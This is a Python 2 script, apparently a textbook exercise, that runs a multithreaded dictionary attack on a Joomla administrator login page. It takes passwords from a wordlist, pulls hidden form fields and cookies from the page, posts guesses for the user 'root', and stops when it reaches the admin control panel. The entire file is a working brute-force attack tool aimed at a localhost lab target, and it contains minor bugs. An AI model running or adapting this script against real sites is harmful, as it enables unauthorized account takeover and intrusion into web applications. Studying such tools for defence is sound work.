import urllib
import urllib2
import cookielib
import Queue
import threading
import sys

from html.parser import HTMLParser

# Will operate in following order.
# Retrieve login page and accept returned cookies
# Parse out all of form elements from HTML
# Set usn/password to guess from dictionary
# Send HTTP post to login processor including HTML forms and cookies
# Test to see if login was successful
from HTMLParser import HTMLParser

# general variables
user_thread = 10
username = "root"
wordlist_file = "C:\Users\\asdf\PycharmProjects\BlackHat\Chapter5\cain2.txt"
resume = None

# target settings
# url is where script will initially download and parse HTML
# post is where the bruteforcing will take place
target_url = "http://localhost/joomlalatest/administrator/index.php"
target_post = "http://localhost/joomlalatest/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Control Panel - localhost - Administration"


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = value


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print "Finished setup for %s" % username

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            page = response.read()

            print "Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize())
            # parse out hidden fields
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            #add usn and passwd fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True

                print "[!!] Bruteforce was successful."
                print "[!!] Usn: %s, Pass: %s" % (username, brute)
                print "[!!] Killing other threads..."

def build_wordlist(wordlist_file):
    # read in the wordlist
    fd = open(wordlist_file, "r")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue.Queue()

    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: {0}".format(resume))
        else:
            words.put(word)
    return words


words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
